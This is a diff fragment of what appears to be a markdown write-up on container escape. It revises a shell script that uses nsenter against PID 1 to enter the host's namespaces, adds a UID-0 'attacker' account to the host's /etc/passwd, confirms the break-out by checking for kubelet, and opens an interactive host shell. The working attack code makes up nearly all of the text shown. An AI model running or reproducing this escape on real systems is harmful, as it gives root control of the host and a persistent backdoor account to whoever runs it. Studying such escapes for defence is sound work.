@@ -223,28 +223,28 @@ echo "[+] Host root filesystem detected at /proc/1/root."
 # Step 1: Ensure full namespace entry using exec nsenter
 echo "[*] Attempting to enter the host's namespaces..."
 
-exec nsenter --target 1 --mount --uts --ipc --net --pid --root=/proc/1/root /bin/sh << 'EOF'
+exec nsenter --target 1 --mount --uts --ipc --net --pid --root=/proc/1/root /bin/sh -c '
     echo "[+] Successfully entered host namespaces."
 
-    # Step 2: Modify /etc/passwd on the host
-    echo "[*] Adding attacker user to /proc/1/root/etc/passwd..."
-    echo "attacker:x:0:0::/root:/bin/bash" >> /proc/1/root/etc/passwd
+    # Step 2: Modify /etc/passwd on the host to add an attacker user
+    echo "[*] Adding attacker user to /etc/passwd..."
+    echo "attacker:x:0:0::/root:/bin/bash" >> /etc/passwd
 
     echo "[+] Attacker user added. Verifying..."
-    grep attacker /proc/1/root/etc/passwd
+    grep attacker /etc/passwd
 
     echo "[+] Escape complete. You are now inside the host."
 
-    # Verify host transition
+    # Step 3: Verify the escape
     echo "[*] Checking system state..."
     echo "Hostname: $(hostname)"
     echo "User: $(whoami)"
     echo "[*] Checking if host kubelet process is visible..."
     ps aux | grep kubelet
 
-    # Open an interactive shell inside the host
+    # Step 4: Open an interactive shell inside the host
     exec /bin/sh
-EOF
+'
 ```
 
 ## Conclusion
